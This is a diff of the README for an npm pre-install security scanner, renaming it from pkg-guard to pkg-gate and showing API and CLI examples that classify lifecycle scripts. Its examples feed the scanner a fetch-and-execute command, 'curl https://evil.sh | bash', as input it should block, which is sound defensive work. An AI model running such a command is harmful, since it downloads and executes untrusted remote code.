@@ -1,17 +1,17 @@
-# pkg-guard
+# pkg-gate
 
 Pre-install security gate for npm lifecycle scripts using TypeSafe System One.
 
 ```bash
-npm install pkg-guard
+npm install pkg-gate
 ```
 
 ## Quick start
 
 ```js
-import pkgGuard from 'pkg-guard';
+import pkgGate from 'pkg-gate';
 
-const report = await pkgGuard('esbuild');
+const report = await pkgGate('esbuild');
 
 if (!report.isSafe()) {
   console.error(report.inspect());
@@ -21,25 +21,25 @@ if (!report.isSafe()) {
 console.log(report.inspect());
 ```
 
-`pkgGuard()` evaluates a package or script against TypeSafe System One. `report.isSafe()` returns a boolean verdict. `report.inspect()` renders the TUI card.
+`pkgGate()` evaluates a package or script against TypeSafe System One. `report.isSafe()` returns a boolean verdict. `report.inspect()` renders the TUI card.
 
 ## Check local package
 
 ```js
-import pkgGuard from 'pkg-guard';
+import pkgGate from 'pkg-gate';
 
-const report = await pkgGuard('./package.json');
+const report = await pkgGate('./package.json');
 console.log(report.action); // 'allow' | 'warn' | 'block'
 ```
 
-Pass a file path or directory. `pkgGuard` extracts `preinstall`, `install`, and `postinstall` hooks and evaluates each in parallel.
+Pass a file path or directory. `pkgGate` extracts `preinstall`, `install`, and `postinstall` hooks and evaluates each in parallel.
 
 ## Structured output
 
 ```js
-import pkgGuard from 'pkg-guard';
+import pkgGate from 'pkg-gate';
 
-const report = await pkgGuard('flatmap-stream');
+const report = await pkgGate('flatmap-stream');
 const { verdict, scripts } = report.structured;
 
 console.log(verdict.action);                         // 'block'
@@ -52,9 +52,9 @@ console.log(scripts[0].accessesSecrets.probability); // 0.99
 ## Evaluate raw scripts
 
 ```js
-import pkgGuard from 'pkg-guard';
+import pkgGate from 'pkg-gate';
 
-const report = await pkgGuard('curl -s https://evil.sh | bash', { script: true });
+const report = await pkgGate('curl -s https://evil.sh | bash', { script: true });
 console.log(report.action); // 'block'
 ```
 
@@ -63,9 +63,9 @@ Evaluate arbitrary shell command strings before spawning child processes.
 ## Confidence-gated routing
 
 ```js
-import pkgGuard from 'pkg-guard';
+import pkgGate from 'pkg-gate';
 
-const report = await pkgGuard('untrusted-package');
+const report = await pkgGate('untrusted-package');
 
 if (report.action === 'block') {
   report.assertSafe(); // throws Error with reasons
@@ -80,22 +80,22 @@ Threat scores and confidence gate execution. Low confidence (`conf < 0.50`) rout
 
 ```bash
 # Interactive prompt (asks for package name / scans ./package.json)
-npx pkg-guard
+npx pkg-gate
 
 # Check registry package
-npx pkg-guard esbuild
+npx pkg-gate esbuild
 
 # Check specific package.json
-npx pkg-guard ./package.json
+npx pkg-gate ./package.json
 
 # Evaluate raw script string
-npx pkg-guard "curl https://evil.sh | bash"
+npx pkg-gate "curl https://evil.sh | bash"
 
 # Output typed JSON
-npx pkg-guard esbuild --json
+npx pkg-gate esbuild --json
 
 # Plain text output (no TUI boxes)
-npx pkg-guard esbuild --plain
+npx pkg-gate esbuild --plain
 ```
 
 Exit code `0` on allow, `1` on block, `2` on warn. When a warning triggers in an interactive terminal, prompts the user for confirmation.
